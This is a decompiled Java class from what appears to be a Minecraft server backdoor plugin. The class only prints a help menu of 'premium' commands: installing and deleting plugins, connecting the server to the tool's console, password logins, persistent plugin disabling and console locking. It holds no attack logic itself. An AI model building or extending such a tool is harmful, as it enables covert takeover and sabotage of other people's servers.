/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl.help;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.Tips;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class PremiumhelpCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        int maxPages = 1;
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("premhelp <1-" + maxPages + ">"));
        } else if (args[1].equalsIgnoreCase("1")) {
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            p2.sendMessage("         " + Settings.DARK_RED + Settings.NAME + " by " + Settings.AUTHOR);
            p2.sendMessage("");
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7install &8l &fInstalls another plugin and enables it"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&7consoleconnect &8l &fConnect server to " + Settings.NAME + " console")));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7delplugin &8l &fDeletes a plugin from the plugins folder"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&7theme &8l &fChange your " + Settings.NAME + " theme")));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7setpass &8l &fSet a password to login"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7clearpass &8l &fMake it so you dont need a password to login"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7checkpass &8l &fCheck what the password is"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7disableLock &8l &fDisable a plugin even if server restarts"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7enableLock &8l &fReverses the effects of disableLock"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7setprefix &8l &fChange your server chat prefix"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7secure &8l &fLock console, cmds and disable plugins"));
            p2.sendMessage("");
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&8(" + Settings.DARK_RED + "Tip&8) l &7" + Tips.getTip())));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

